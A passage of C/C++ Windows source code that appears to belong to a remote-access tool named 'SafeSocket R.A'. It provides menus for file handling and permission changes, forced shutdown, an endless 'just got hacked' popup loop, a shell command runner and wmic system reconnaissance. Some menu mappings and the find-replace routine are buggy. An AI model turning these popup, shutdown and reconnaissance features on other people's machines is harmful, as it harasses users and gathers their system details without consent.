    if (status == 0) {
        printf("File copied successfully from '%s' to '%s'.\n", source, destination); // Print success message
        return 1; // Return 1 indicating success
    } else {
        printf("Error copying file.\n"); // Print error message
        return 0; // Return 0 indicating failure
    }
}



// Function to list directory contents
void listDirectory(const char *path) {
    WIN32_FIND_DATA findFileData; // Structure to hold information about the found file
    HANDLE hFind = INVALID_HANDLE_VALUE; // Handle for find operation, initialized to invalid value
    char searchPath[256]; // Buffer to store search path

    // Construct search path to list all files and directories in 'path'
    snprintf(searchPath, sizeof(searchPath), "%s\\*", path);

    // Start find operation to find the first file or directory in 'searchPath'
    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) { // Check if find operation failed
        printf("Error listing directory contents.\n"); // Print error message
        return; // Exit function
    }

    // Loop through all files and directories found
    do {
        printf("%s\n", findFileData.cFileName); // Print the name of the found file or directory
    } while (FindNextFile(hFind, &findFileData) != 0); // Continue looping while there are more files/directories to find

    FindClose(hFind); // Close the find handle
}


// Function to check if a file exists
int fileExists(const char *filename) {
    // Check if access to the file is possible (0 means success)
    if (_access(filename, 0) == 0) {
        printf("File '%s' exists.\n", filename); // Print message indicating file exists
        return 1; // Return 1 indicating file exists
    } else {
        printf("File '%s' does not exist.\n", filename); // Print message indicating file does not exist
        return 0; // Return 0 indicating file does not exist
    }
}



// Function to display a menu for Copy, List, or Check operations
int Cp_Lst_Chk_menu() {
    int choice; // Variable to store user's menu choice
    char source[256], destination[256], directory[256], filename[256]; // Arrays to store file and directory paths

    printf("Choose an operation:\n"); // Display menu header
    printf("1. Copy File\n"); // Option to copy a file
    printf("2. List Directory Contents\n"); // Option to list directory contents
    printf("3. Check if File Exists\n"); // Option to check if a file exists
    printf("Enter your choice (1, 2, or 3): "); // Prompt for user input
    scanf("%d", &choice); // Read user's choice

    switch (choice) { // Evaluate user's choice
        case 1:
            printf("Enter the source path (file to copy): "); // Prompt for source file path
            scanf("%s", source); // Read source file path
            printf("Enter the destination path (file to create): "); // Prompt for destination file path
            scanf("%s", destination); // Read destination file path
            copyFile(source, destination); // Call function to copy file
            break; // Exit switch statement
        case 2:
            printf("Enter the directory path: "); // Prompt for directory path
            scanf("%s", directory); // Read directory path
            listDirectory(directory); // Call function to list directory contents
            break; // Exit switch statement
        case 3:
            printf("Enter the file path to check: "); // Prompt for file path to check
            scanf("%s", filename); // Read file path
            fileExists(filename); // Call function to check if file exists
            break; // Exit switch statement
        default:
            printf("Invalid choice. Please enter 1, 2, or 3.\n"); // Print error message for invalid input
            return 1; // Return 1 to indicate failure
    }

    return 0; // Return 0 to indicate success
}


// Function to create a file and write a test message to it
void createFile(const char *filepath) {
    FILE *file = fopen(filepath, "w"); // Open file in write mode ("w")
    
    if (file == NULL) { // Check if file opening was successful
        printf("Error opening file for writing: %s\n", strerror(errno)); // Print error message with error description
        return; // Exit function if file opening failed
    }
    
    fprintf(file, "Hello, this is a test file.\n"); // Write a test message to the file
    fclose(file); // Close the file
    
    printf("File '%s' created and written to successfully.\n", filepath); // Print success message
}

// Function to delete a file
void deleteFile(const char *filepath) {
    if (remove(filepath) == 0) { // Attempt to remove/delete the file specified by 'filepath'
        printf("File '%s' deleted successfully.\n", filepath); // If removal is successful, print success message
    } else {
        printf("Error deleting file '%s': %s\n", filepath, strerror(errno)); // If removal fails, print error message with details
    }
}

// Function to append content to a file
void appendToFile(const char *filepath) {
    FILE *file = fopen(filepath, "a"); // Open file in append mode ("a")
    
    if (file == NULL) { // Check if file opening was successful
        printf("Error opening file for appending: %s\n", strerror(errno)); // Print error message with error description
        return; // Exit function if file opening failed
    }
    
    printf("Enter the content you want to write to the file:\n"); // Prompt user to enter content
    char buffer[256]; // Buffer to store user input
    
    while (getchar() != '\n'); // Clear the input buffer to avoid issues with fgets
    
    fgets(buffer, sizeof(buffer), stdin); // Read input from user, ensuring it doesn't exceed buffer size
    fprintf(file, "%s", buffer); // Write the content stored in buffer to the file
    fclose(file); // Close the file
    
    printf("Content written to file '%s' successfully.\n", filepath); // Print success message
}


// Function to create a directory
void createDirectory(const char *dirpath) {
    if (_mkdir(dirpath) == 0) { // Attempt to create directory specified by 'dirpath'
        printf("Directory '%s' created successfully.\n", dirpath); // If creation is successful, print success message
    } else {
        printf("Error creating directory '%s': %s\n", dirpath, strerror(errno)); // If creation fails, print error message with details
    }
}



// Function to display file operation menu and perform selected operation
int f_op_menu() {
    char path[256]; // Variable to store the path entered by the user
    int choice; // Variable to store the user's menu choice

    // Display menu options
    printf("Choose an operation:\n");
    printf("1. Create file\n");
    printf("2. Delete file\n");
    printf("3. Open and write to file\n");
    printf("4. Create directory\n");
    printf("Enter your choice (1, 2, 3, or 4): ");
    scanf("%d", &choice); // Read user's choice from input

    printf("Enter the full path: ");
    scanf("%s", path); // Read the path from input and store it in 'path'

    switch (choice) {
        case 1:
            createFile(path); // Call createFile function with 'path' as argument
            break;
        case 2:
            deleteFile(path); // Call deleteFile function with 'path' as argument
            break;
        case 3:
            appendToFile(path); // Call appendToFile function with 'path' as argument
            break;
        case 4:
            createDirectory(path); // Call createDirectory function with 'path' as argument
            break;
        default:
            printf("Invalid choice. Please enter 1, 2, 3, or 4.\n"); // Display error message for invalid choice
            return 1; // Return 1 to indicate error
    }

    return 0; // Return 0 to indicate successful completion
}





// Function to copy a file
bool copyFilee(const char *src, const char *dest) {
    if (CopyFile(src, dest, FALSE)) { // Attempt to copy file from 'src' to 'dest'
        printf("File copied successfully.\n"); // If successful, print success message
        return true; // Return true indicating success
    } else {
        DWORD error = GetLastError(); // Get the error code if CopyFile fails
        fprintf(stderr, "Failed to copy file. Error code: %lu\n", error); // Print error message with error code
        return false; // Return false indicating failure
    }
}

// Function to backup a file
bool performBackup(const char *srcPath, const char *backupDir) {
    char destPath[MAX_PATH_LEN]; // Variable to hold the destination path

    // Construct destination path by appending source file name to backup directory
    snprintf(destPath, sizeof(destPath), "%s\\%s", backupDir, strrchr(srcPath, '\\') + 1);

    // Perform the backup by calling copyFilee function
    return copyFilee(srcPath, destPath); // Return the result of the copy operation
}

// Function to restore a file from backup
bool performRestore(const char *backupFilePath, const char *restoreDir) {
    char destPath[MAX_PATH_LEN]; // Variable to hold the destination path for restoration

    // Construct destination path by appending backup file name to restore directory
    snprintf(destPath, sizeof(destPath), "%s\\%s", restoreDir, strrchr(backupFilePath, '\\') + 1);

    // Perform the restoration by calling copyFilee function
    return copyFilee(backupFilePath, destPath); // Return the result of the copy operation
}



void backupMenu(){
    char sourceFile[MAX_PATH_LEN]; // Variable to hold the path of the file to backup
    char backupDir[MAX_PATH_LEN]; // Variable to hold the backup directory path
    char backupFilePath[MAX_PATH_LEN]; // Variable to hold the path of the file to restore from backup
    char restoreDir[MAX_PATH_LEN]; // Variable to hold the restore directory path

    // Get source file path
    printf("Enter the path of the file to backup: ");
    fgets(sourceFile, sizeof(sourceFile), stdin); // Read source file path from user input
    sourceFile[strcspn(sourceFile, "\n")] = 0;  // Remove newline character if present

    // Get backup directory
    printf("Enter the backup directory path: ");
    fgets(backupDir, sizeof(backupDir), stdin); // Read backup directory path from user input
    backupDir[strcspn(backupDir, "\n")] = 0;  // Remove newline character if present

    // Perform backup
    if (performBackup(sourceFile, backupDir)) { // Call performBackup function with sourceFile and backupDir
        // Prompt for restore
        printf("File backed up successfully.\n");

        // Get backup file path (for restoration)
        printf("Enter the path of the file to restore from backup: ");
        fgets(backupFilePath, sizeof(backupFilePath), stdin); // Read backup file path from user input
        backupFilePath[strcspn(backupFilePath, "\n")] = 0;  // Remove newline character if present

        // Get restore directory
        printf("Enter the restore directory path: ");
        fgets(restoreDir, sizeof(restoreDir), stdin); // Read restore directory path from user input
        restoreDir[strcspn(restoreDir, "\n")] = 0;  // Remove newline character if present

        // Perform restore
        if (performRestore(backupFilePath, restoreDir)) { // Call performRestore function with backupFilePath and restoreDir
            printf("File restored successfully.\n"); // Print success message if restore succeeds
        } else {
            fprintf(stderr, "Failed to restore file.\n"); // Print error message if restore fails
        }
    } else {
        fprintf(stderr, "Failed to backup file.\n"); // Print error message if backup fails
    }
}


void SetFilePermissions(LPCWSTR filePath) {
    // Define the new permissions
    DWORD permissions = GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE | DELETE;

    // Get the current user's SID
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) { // Open the process token for the current process
        std::wcerr << L"OpenProcessToken error: " << GetLastError() << std::endl; // Print error if failed
        return; // Return if token retrieval fails
    }

    DWORD length = 0;
    GetTokenInformation(token, TokenUser, NULL, 0, &length); // Retrieve the size of the token information
    PTOKEN_USER tokenUser = (PTOKEN_USER)malloc(length); // Allocate memory for token information
    if (!GetTokenInformation(token, TokenUser, tokenUser, length, &length)) { // Get the token information
        std::wcerr << L"GetTokenInformation error: " << GetLastError() << std::endl; // Print error if failed
        free(tokenUser); // Free allocated memory
        CloseHandle(token); // Close the token handle
        return; // Return if token information retrieval fails
    }

    PSID userSID = tokenUser->User.Sid; // Get the user's SID from the token

    // Create a new ACL that grants full control to the current user
    EXPLICIT_ACCESS_W ea = {}; // Initialize an EXPLICIT_ACCESS_W structure
    ea.grfAccessPermissions = permissions; // Set access permissions
    ea.grfAccessMode = SET_ACCESS; // Set access mode to allow setting access
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT; // Inherit permissions to subcontainers and objects
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID; // The trustee is identified by SID
    ea.Trustee.TrusteeType = TRUSTEE_IS_USER; // The trustee type is a user
    ea.Trustee.ptstrName = (LPWSTR)userSID; // Set the trustee name to the user's SID

    PACL acl = NULL;
    if (SetEntriesInAclW(1, &ea, NULL, &acl) != ERROR_SUCCESS) { // Create an ACL and add the specified access control entry
        std::wcerr << L"SetEntriesInAclW error: " << GetLastError() << std::endl; // Print error if failed
        free(tokenUser); // Free allocated memory
        CloseHandle(token); // Close the token handle
        return; // Return if ACL creation fails
    }

    // Set the new DACL on the file or directory
    if (SetNamedSecurityInfoW((LPWSTR)filePath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, acl, NULL) != ERROR_SUCCESS) {
        std::wcerr << L"SetNamedSecurityInfoW error: " << GetLastError() << std::endl; // Set the security information for the specified file or directory object
    } else {
        std::wcout << L"Permissions set successfully for " << filePath << std::endl; // Print success message if permissions set successfully
    }

    // Clean up
    if (acl != NULL) LocalFree(acl); // Free the allocated ACL memory
    free(tokenUser); // Free the allocated token user memory
    CloseHandle(token); // Close the token handle
}






void File_perm_menu(){
    wchar_t filePath[MAX_PATH]; // Define a wide character array to store the file or directory path
    std::wcout << L"Enter the file or directory path: "; // Prompt user to enter the file or directory path
    std::wcin.getline(filePath, MAX_PATH); // Read the input file path from standard input

    SetFilePermissions(filePath); // Call the function to set permissions for the specified file or directory
}



void find_replace(const char *filename, const char *search, const char *replace) {
    FILE *file = fopen(filename, "r+"); // Open the file for reading and writing
    if (file == NULL) {
        perror("Error opening file"); // Print error message if file opening fails
        return; // Return if file opening fails
    }

    char buffer[BUFSIZ]; // Buffer to store lines read from the file
    size_t search_len = strlen(search); // Length of the search string
    size_t replace_len = strlen(replace); // Length of the replace string
    long pos; // Position variable to track where the search string was found

    while (fgets(buffer, sizeof(buffer), file) != NULL) { // Read lines from the file into buffer
        char *p;
        while ((p = strstr(buffer, search)) != NULL) { // Find occurrences of search string in buffer
            pos = p - buffer; // Calculate the position of the search string in the buffer
            fseek(file, -strlen(buffer) + pos, SEEK_CUR); // Move file pointer to the position of the found string
            fwrite(replace, 1, replace_len, file); // Write replace string over the search string in the file
            fseek(file, pos + search_len, SEEK_CUR); // Move file pointer to the end of the replaced string
            memset(buffer, 0, sizeof(buffer)); // Clear the buffer
        }
    }

    fclose(file); // Close the file
    printf("String replaced successfully in file '%s'.\n", filename); // Print success message
}






void search_in_file_menu(){
    char filename[256]; // Array to store the filename
    char search[100];   // Array to store the search string
    char replace[100];  // Array to store the replace string

    printf("Enter the name of the file: "); // Prompt user to enter the filename
    scanf("%s", filename); // Read the filename from user input

    printf("Enter the string to search: "); // Prompt user to enter the string to search for
    scanf("%s", search); // Read the search string from user input

    printf("Enter the string to replace '%s' with: ", search); // Prompt user to enter the string to replace with
    scanf("%s", replace); // Read the replace string from user input

    find_replace(filename, search, replace); // Call find_replace function to perform search and replace
}




void check_disk_space(const char *drive) {
    ULARGE_INTEGER total_bytes;        // Variable to store total bytes on the drive
    ULARGE_INTEGER free_bytes;         // Variable to store free bytes on the drive
    ULARGE_INTEGER available_bytes;    // Variable to store available bytes on the drive
    char volume_name[MAX_PATH + 1] = { 0 };  // Array to store volume name

    // Retrieve disk space information
    if (GetDiskFreeSpaceEx(drive,
                           &available_bytes,
                           &total_bytes,
                           &free_bytes)) {
        // Calculate used space
        ULONGLONG used_bytes = total_bytes.QuadPart - free_bytes.QuadPart;

        // Convert bytes to gigabytes (1 GB = 1024^3 bytes)
        double total_gb = (double)total_bytes.QuadPart / (1024 * 1024 * 1024);
        double free_gb = (double)free_bytes.QuadPart / (1024 * 1024 * 1024);
        double used_gb = (double)used_bytes / (1024 * 1024 * 1024);

        // Get volume label
        if (!GetVolumeInformation(drive,
                                  volume_name,
                                  MAX_PATH + 1,
                                  NULL,
                                  NULL,
                                  NULL,
                                  NULL,
                                  0)) {
            fprintf(stderr, "Error retrieving volume information for drive %s.\n", drive);
            return;
        }

        printf("Drive %s (%s):\n", drive, volume_name); // Print drive information with volume name
        printf("Total space: %.2f GB\n", total_gb);     // Print total space in gigabytes
        printf("Used space: %.2f GB\n", used_gb);       // Print used space in gigabytes
        printf("Free space: %.2f GB\n", free_gb);       // Print free space in gigabytes
        printf("Available space: %.2f GB\n", (double)available_bytes.QuadPart / (1024 * 1024 * 1024)); // Print available space in gigabytes
    } else {
        fprintf(stderr, "Error retrieving disk space information for drive %s.\n", drive); // Print error if disk space information retrieval fails
    }
}




void check_disk_menu(){
    char drive[MAX_PATH]; // Variable to store the drive letter or path

    printf("Enter the drive letter (e.g., C:\\): "); // Prompt user to enter the drive letter or path
    scanf("%s", drive); // Read the input from user

    check_disk_space(drive); // Call function to check disk space for the specified drive
}



void open_any_f_menu(){
	std::string filePath;

    // Input the file path from the user
    std::cout << "Enter the file path to open: ";
    std::getline(std::cin, filePath);

    // Use ShellExecute to open the file with its default program
    HINSTANCE result = ShellExecuteA(NULL, "open", filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);

    // Check if the file was opened successfully
    if ((intptr_t)result > 32) {
        std::cout << "File opened successfully." << std::endl;
    } else {
        DWORD error = GetLastError();
        std::cerr << "Failed to open file. Error code: " << error << std::endl;
    }
}





void displayFileProperties(const char* filePath) {

    // Open the file to get its handle
    HANDLE hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "Error opening file. Make sure the file path is correct." << endl;
        return;
    }

    // Get file basic information
    BY_HANDLE_FILE_INFORMATION fileInfo;
    if (!GetFileInformationByHandle(hFile, &fileInfo)) {
        CloseHandle(hFile);
        cout << "Error getting file information." << endl;
        return;
    }

    // Convert file time to local time
    SYSTEMTIME creationTime, lastAccessTime, lastWriteTime;
    FileTimeToSystemTime(&fileInfo.ftCreationTime, &creationTime);
    FileTimeToSystemTime(&fileInfo.ftLastAccessTime, &lastAccessTime);
    FileTimeToSystemTime(&fileInfo.ftLastWriteTime, &lastWriteTime);

    // Display file properties
    cout << "File Properties for: " << filePath << endl;
    cout << "---------------------------------------------" << endl;
    
    // Display Creation Time
    cout << "Creation Time: " << setfill('0')
         << setw(2) << creationTime.wDay << "/" 
         << setw(2) << creationTime.wMonth << "/" 
         << setw(4) << creationTime.wYear << "  "
         << setw(2) << creationTime.wHour << ":" 
         << setw(2) << creationTime.wMinute << ":" 
         << setw(2) << creationTime.wSecond << endl;

    // Display Last Access Time
    cout << "Last Access Time: " << setfill('0')
         << setw(2) << lastAccessTime.wDay << "/" 
         << setw(2) << lastAccessTime.wMonth << "/" 
         << setw(4) << lastAccessTime.wYear << "  "
         << setw(2) << lastAccessTime.wHour << ":" 
         << setw(2) << lastAccessTime.wMinute << ":" 
         << setw(2) << lastAccessTime.wSecond << endl;

    // Display Last Write Time
    cout << "Last Write Time: " << setfill('0')
         << setw(2) << lastWriteTime.wDay << "/" 
         << setw(2) << lastWriteTime.wMonth << "/" 
         << setw(4) << lastWriteTime.wYear << "  "
         << setw(2) << lastWriteTime.wHour << ":" 
         << setw(2) << lastWriteTime.wMinute << ":" 
         << setw(2) << lastWriteTime.wSecond << endl;

    // Display file attributes
    cout << "File Attributes: ";
    if (fileInfo.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
        cout << "Read-only ";
    if (fileInfo.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
        cout << "Hidden ";
    if (fileInfo.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)
        cout << "System ";
    if (fileInfo.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        cout << "Directory ";
    cout << endl;

    // Close the file handle
    CloseHandle(hFile);
}



int filePropMenu(){
    const char* filePath = "C:\\Users\\PC\\Desktop\\phoenix\\DEVELOPMENT\\PHASE3\\sssss.txt";

    // Display file properties
    displayFileProperties(filePath);

    // Open the file to get its handle
    HANDLE hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "Error opening file. Make sure the file path is correct." << endl;
        return 1;
    }

    // Get the file size
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        cout << "Error getting file size." << endl;
        return 1;
    }

    // Read file content
    DWORD bytesRead;
    char buffer[1024]; // Buffer to read file content

    if (!ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
        CloseHandle(hFile);
        cout << "Error reading file." << endl;
        return 1;
    }

    // Close the file handle
    CloseHandle(hFile);

    // Display the file sizes
    cout << "Actual file size of '" << filePath << "' is: " << fileSize.QuadPart << " bytes." << endl;
    cout << "Allocated size on disk of '" << filePath << "' is: " << fileSize.QuadPart << " bytes." << endl;

    // Display the content read from the file
    cout << "Content of the file:" << endl;
    cout.write(buffer, bytesRead); // Write buffer to cout	

    return 0;
}

void clear_file(const char *filename) {
    FILE *file = fopen(filename, "w");  // Open the file in write mode
    if (file == NULL) {
        perror("Error opening file");
        return;
    }
    fclose(file);  // Close the file immediately to clear its content
    printf("File '%s' has been cleared.\n", filename);
}

void concatenate_files(int file_count, char *file_names[], const char *output_filename) {
    FILE *output_file = fopen(output_filename, "w"); // Open the output file in write mode
    if (output_file == NULL) {
        perror("Error opening output file"); // Print error message if opening fails
        return;
    }

    // Loop through each input file to concatenate
    for (int i = 0; i < file_count; i++) {
        FILE *input_file = fopen(file_names[i], "r"); // Open each input file in read mode
        if (input_file == NULL) {
            perror("Error opening input file"); // Print error message if opening fails
            continue; // Skip to the next file if current file cannot be opened
        }

        char buffer[BUFSIZ];
        size_t n;
        // Read from input file and write to output file
        while ((n = fread(buffer, 1, sizeof(buffer), input_file)) > 0) {
            fwrite(buffer, 1, n, output_file); // Write buffer content to output file
        }

        fclose(input_file); // Close the current input file
    }

    fclose(output_file); // Close the output file after all input files are processed
    printf("Files have been concatenated into '%s'.\n", output_filename); // Print success message
}

void count_words_lines(const char *filename) {
    FILE *file = fopen(filename, "r"); // Open the file in read mode
    if (file == NULL) {
        perror("Error opening file"); // Print error message if opening fails
        return;
    }

    int word_count = 0;
    int line_count = 0;
    int in_word = 0;
    char c;

    // Read characters until end of file
    while ((c = fgetc(file)) != EOF) {
        if (isspace(c)) { // Check if character is whitespace
            if (in_word) { // If coming out of a word
                word_count++; // Increment word count
                in_word = 0; // Set flag to indicate not in word
            }
            if (c == '\n') { // Check if character is newline
                line_count++; // Increment line count
            }
        } else {
            in_word = 1; // Set flag to indicate in word
        }
    }

    // Check if the last word was counted
    if (in_word) {
        word_count++;
    }
    // Count the last line if not counted due to EOF
    if (c != '\n' && word_count > 0) {
        line_count++;
    }

    fclose(file); // Close the file

    // Output results
    printf("File '%s' has %d words and %d lines.\n", filename, word_count, line_count);
}


void more_f_menu(){
    int choice;
    printf("Choose an option:\n");
    printf("1. Clear the contents of a file\n");
    printf("2. Concatenate multiple files into one\n");
    printf("3. Count words and lines in a file\n");
    printf("Enter your choice (1, 2, or 3): ");
    scanf("%d", &choice);

    if (choice == 1) {
        // Option 1: Clear the contents of a file
        char filename[256];
        printf("Enter the name of the file to clear: ");
        scanf("%s", filename);
        clear_file(filename);
    } else if (choice == 2) {
        // Option 2: Concatenate multiple files into one
        int file_count;
        printf("Enter the number of files to concatenate: ");
        scanf("%d", &file_count);

        // Allocate memory for file names
        char **file_names = (char **)malloc(file_count * sizeof(char *));
        for (int i = 0; i < file_count; i++) {
            file_names[i] = (char *)malloc(256 * sizeof(char));
            printf("Enter the name of file %d: ", i + 1);
            scanf("%s", file_names[i]);
        }

        // Enter the output file name
        char output_filename[256];
        printf("Enter the name of the output file: ");
        scanf("%s", output_filename);

        // Call function to concatenate files
        concatenate_files(file_count, file_names, output_filename);

        // Free allocated memory for file names
        for (int i = 0; i < file_count; i++) {
            free(file_names[i]);
        }
        free(file_names);
    } else if (choice == 3) {
        // Option 3: Count words and lines in a file
        char filename[256];
        printf("Enter the name of the file to count words and lines: ");
        scanf("%s", filename);
        count_words_lines(filename);
    } else {
        // Invalid choice
        printf("Invalid choice.\n");
    }
}






void Main_Menu_F(){
	
	while(1){
		system("cls");
	//add gotoxy box if possible
	int user_choice;
	cout<<"---------------------------------------\n";
	cout<<"[+] SafeSocket R.A File Functionalities: "<<endl;
	cout<<"---------------------------------------\n\n\n";
	
	cout<<"-----------------------------------------\n";
	cout<<"| 1. Open File Monitoring Menu          |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 2. Open Move file Menu                |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 3. Open Check File Menu               |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 4. Open Stabdard File Operations Menu |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 6. Open Backup Menu                   |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 7. Open File Permission Menu          |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 8. Open File Searchiung Menu          |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 9. Open Disk Checking Menu            |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 10. Open Open File Menu               |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 11. Open File Reading Menu            |"<<endl;
		cout<<"-----------------------------------------\n";
	cout<<"| 12. Open Other File F Menu            |"<<endl;
	cout<<"-----------------------------------------\n\n";
	
	cout<<"Enter choice: ";
	cin>>user_choice;
	
	if(user_choice==1){
		system("cls");
		Monitor_menu();
	}else if(user_choice==2){
		system("cls");
		REN_MV_FILE_MENU();
	}else if(user_choice==3){
		system("cls");
		Cp_Lst_Chk_menu();
	}else if(user_choice==4){
		system("cls");
		f_op_menu();
	}else if(user_choice==5){
		system("cls");
		backupMenu();	
	}else if(user_choice==6){
		system("cls");
		File_perm_menu();
	}else if(user_choice==7){
		system("cls");
		search_in_file_menu();
	}else if(user_choice==8){
		system("cls");
		check_disk_menu();
	}else if(user_choice==9){
		system("cls");
		open_any_f_menu();
	}else if(user_choice==10){
		system("cls");
		open_any_f_menu();
	}else if(user_choice==11){
		system("cls");
		filePropMenu();
	}else if(user_choice==12){
		system("cls");
		more_f_menu();
	}else{
		cout<<"Invalid Input!!!";
	}
	
}



}
































void Message_Box(){
	while(1){
	
 MessageBox(NULL, "just got hacked", "hacker window", MB_OK | MB_ICONWARNING/*can be change forr the icon to be.......*/);
}
}
   
   
   
int Pc_Power_Handles(){
	char choice[10];

    printf("Enter 'off' to switch off or 'restart' to restart the PC: ");
    scanf("%s", choice);

    if (strcmp(choice, "off") == 0) {
        system("shutdown /s /t 0");
    } else if (strcmp(choice, "restart") == 0) {
        system("shutdown /r /t 0");
    } else {
        printf("Invalid choice!\n");
        return 1;
    }
}

int Notepad_Con(){
	// Create a temporary file
    ofstream tempfile("temp.txt");

    if (!tempfile) {
        cerr << "Error: Unable to create temporary file." << endl;
        return 1;
    }

    tempfile.close();

     // Open Notepad with the temporary file
            system("start notepad temp.txt");

    // Prompt user for input
    cout << "Type something and press Enter to write it in Notepad. Type 'exit' to quit." << endl;

    // Read input from user
    string input;
    while (getline(cin, input)) {
        // Check if user wants to exit
        if (input == "exit") {
            cout << "Exiting..." << endl;
            break;
        }

        // Open the temporary file in append mode and write the input
        ofstream tempfile("temp.txt", ios::app);
        if (tempfile.is_open()) {
            tempfile << input << endl;
            tempfile.close();
			system("taskkill /IM notepad.exe /F");
            // Open Notepad with the temporary file
            system("start notepad temp.txt");
        } else {
            cerr << "Error: Unable to write to temporary file." << endl;
            return 1;
        }

        cout << "Type something and press Enter to write it in Notepad. Type 'exit' to quit." << endl;
    }
}





void Cmd_Chat_Win(){
	
	string userInput;
	
	while (true) {
        cout << "> "; // Display prompt
        getline(cin, userInput); // Read user input

        // Check if the user wants to exit
        if (userInput == "exit") {
            break;
        }

        
    }
		
	
}
   
   
   
   int Menu(){
   	
   	system("cls");
   	
   	cout<<"------------------------------\n";
	cout<<"[+] Standart system options: |"<<endl;
	cout<<"------------------------------\n\n\n";
	
	cout<<"-------------------------------\n";
	cout<<"1. Open CMD Chat Window       |"<<endl;
	cout<<"-------------------------------\n";
	cout<<"2. Open Notepad chat controll |\n";
	cout<<"-------------------------------\n";
	cout<<"3. Open PC power Options      |"<<endl; 
	cout<<"-------------------------------\n";
	cout<<"4. Open Pop Up Window         |\n";
	cout<<"-------------------------------\n";
	
	int o;
	cin>>o;
	
	if(o==1){
		system("cls");
		Cmd_Chat_Win();
		
	}else if (o==2){
		system("cls");
		Notepad_Con();
	}else if(o==3){
		system("cls");
		Pc_Power_Handles();
	}else if(o==4){
		system("cls");
		Message_Box();
	}
	else{
		cout<<"Invalid Choice!!!";
	}
	
	
	return 0;
}
   
   
   
   

   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   

//function that is specifically made to execute all the bellow commands
string executeCommand(const char* cmd) {
    // Buffer to store command output temporarily
    char buffer[128];
    // String to accumulate the full command output
    string result = "";
    // Open a pipe to execute the command
    FILE* pipe = _popen(cmd, "r");
    // Check if the pipe failed to open
    if (!pipe) {
        cerr << "popen() failed!" << endl;
        return "ERROR";
    }
    try {
        // Read the output of the command line by line
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            // Append each line to the result string
            result += buffer;
        }
    } catch (...) {
        // Ensure the pipe is closed if an exception is thrown
        _pclose(pipe);
        throw;
    }
    // Close the pipe
    _pclose(pipe);
    // Return the accumulated result
    return result;
}



//Function that gets and prints out the Bios information of the currect machine
void Bios_Info_Print_F() {
  // Command to get BIOS version
    string command = "wmic bios get SMBIOSBIOSVersion";  
    // Execute the command and store the output in biosVersion
    string biosVersion = executeCommand(command.c_str());  

    // Command to get Windows and System directories
    command = "wmic os get WindowsDirectory,SystemDirectory";
    // Execute the command and store the output in osInfo
    string osInfo = executeCommand(command.c_str());

    // Command to get boot device information
    command = "wmic diskdrive get DeviceID,Model";
    // Execute the command and store the output in bootDevice
    string bootDevice = executeCommand(command.c_str());

    // Print the BIOS version
   cout << "---------------------\n";
   cout << "[+] BIOS Version: " << biosVersion.substr(biosVersion.find('\n') + 1) << "\n";
   cout << "---------------------\n\n\n\n";

    // Print OS Information
    cout << "----------------------------------------\n";
    cout << "[+] OS Information:\n\n";
    // Extract and print the Windows Directory (second line of osInfo)
    size_t osInfoSecondLineStart = osInfo.find('\n') + 1;
    string windowsDir = osInfo.substr(osInfoSecondLineStart, osInfo.find(' ', osInfoSecondLineStart) - osInfoSecondLineStart);
    string systemDir = osInfo.substr(osInfo.find(' ', osInfoSecondLineStart) + 2);
    cout << "# Windows Directory: " << windowsDir << "\n";
    cout << "# System Directory:  " <<  systemDir;
    cout << "----------------------------------------\n\n\n\n";

    // Print Boot Device
    cout << "--------------------------------------------------\n";
    cout << "[+] Boot Device (and disks): \n\n" << bootDevice.substr(bootDevice.find('\n') + 1) << "\n";
    cout << "--------------------------------------------------\n";
}







//Function that gets and prints the cpu information on the current machine
void Cpu_Print_F(){
   // Command to get detailed CPU information
    string command = "wmic cpu get Caption,DeviceID,Manufacturer,Name,NumberOfCores";
    string command2 = "wmic cpu get NumberOfLogicalProcessors,MaxClockSpeed,ProcessorId,Architecture";
    string command3 = "wmic cpu get Family,L2CacheSize,L3CacheSize,CurrentClockSpeed,SocketDesignation";
    // Execute the command and store the output in result
    string result = executeCommand(command.c_str());
    string result2 = executeCommand(command2.c_str());
    string result3 = executeCommand(command3.c_str());

    // Print the CPU information header
    cout<<"------------------------\n";
    cout << "[+] CPU Information:\n";
    cout<<"------------------------\n\n";
    // Print the retrieved CPU information
    cout << result << endl<<endl;
    cout<<result2<<endl<<endl;
    cout<<result3<<endl<<endl;
}




//Function that gets information baput the Host Name of the machine currently on
int Get_Host_Name_F(){
// Buffer to store the host name
    char hostname[256];

    // Variable to store the size of the buffer
    DWORD size = sizeof(hostname);
    // Get the host name of the computer
    if (!GetComputerNameA(hostname, &size)) {
        // If there is an error, print an error message and return 1
        printf("Error getting computer name.\n");
        return 1;
    }

    // Print the retrieved host name
    cout<<"------------------------------\n";
    printf("[+] Host name: %s\n", hostname);
    cout<<"------------------------------\n";
